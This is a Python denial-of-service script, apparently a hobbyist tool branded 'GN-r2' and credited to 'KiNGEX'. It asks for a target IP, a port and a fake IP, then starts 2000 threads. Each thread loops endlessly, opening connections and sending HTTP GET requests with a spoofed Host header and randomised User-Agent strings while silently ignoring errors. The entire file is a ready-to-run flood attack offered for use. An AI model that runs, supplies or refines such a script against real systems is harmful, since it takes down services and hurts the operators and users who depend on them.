import socket
import threading
import random
import os

def get_user_input():
    os.system("clear")
    os.system("figlet GN-r2")
    print("made by KiNGEX")
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))
    fake_ip = input("Enter a fake IP: ")
    return target_ip, target_port, fake_ip

requests_sent = 0

def attack(target_ip, target_port, fake_ip):
    global requests_sent
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            headers = f"GET /{target_ip} HTTP/1.1\r\n"
            headers += f"Host: {fake_ip}\r\n"
            headers += f"User-Agent: {random.choice(['Mozilla/5.0', 'Android/7.0', 'Chrome/80.0.3987.87'])}\r\n"
            headers += "Accept-language: en-US,en;q=0.9\r\n\r\n"
            s.sendto(headers.encode("ascii"), (target_ip, target_port))
            s.close()
            requests_sent += 1
            print(f"Requests Sent: {requests_sent}")
        except:
            pass

# Get user input, initiate the supersonic attack, and keep countin'
target_ip, target_port, fake_ip = get_user_input()
for _ in range(2000):
    thread = threading.Thread(target=attack, args=(target_ip, target_port, fake_ip))
    thread.start()
